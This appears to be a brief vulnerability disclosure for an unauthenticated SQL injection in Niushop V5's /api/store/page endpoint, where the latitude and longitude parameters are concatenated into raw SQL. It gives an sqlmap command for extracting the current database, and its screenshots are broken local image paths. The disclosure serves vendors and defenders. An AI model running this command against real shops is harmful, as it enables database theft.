### A SQL injection vulnerability exits inNiushop V5

Official website：https://gitee.com/niushop-team/niushop_b2c_v5#https://gitee.com/link?target=https%3A%2F%2Fwww.kancloud.cn%2Fniucloud%2Fniushop_b2c_v5%2F3037616](https://gitee.com/niushop-team/niushop_b2c_v5#https:/gitee.com/link?target=https%3A%2F%2Fwww.kancloud.cn%2Fniucloud%2Fniushop_b2c_v5%2F3037616

Version：V5

Route：/api/store/page?latitude=1&longitude=1

Injection parameters：latitude and longitude

#### 1.Vulnerability analysis

In the **getLocationStoreList** function in niushop_b2c_v5-master/niushop/app/model/store/Store.php, the native SQL statement concatenates $lnglat[ 'lng' ] and $lnglat[ 'lat' ].

![image-20250218145237300](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250218145237300.png)

And niushop_b2c_v5-master/niushop/app/api/controller/Store.php calls this method.

![image-20250218145245956](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250218145245956.png)

The vulnerability condition can be triggered without logging in.

#### 2.Vulnerability verification and exploitation

https://127.0.0.1/api/store/page?latitude=1&longitude=1

sqlmap --batch --tamper=space2comment -r post.txt -- current-db

![image-20250218145310991](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250218145310991.png)

![image-20250218145317558](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250218145317558.png)

![image-20250218145332706](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250218145332706.png)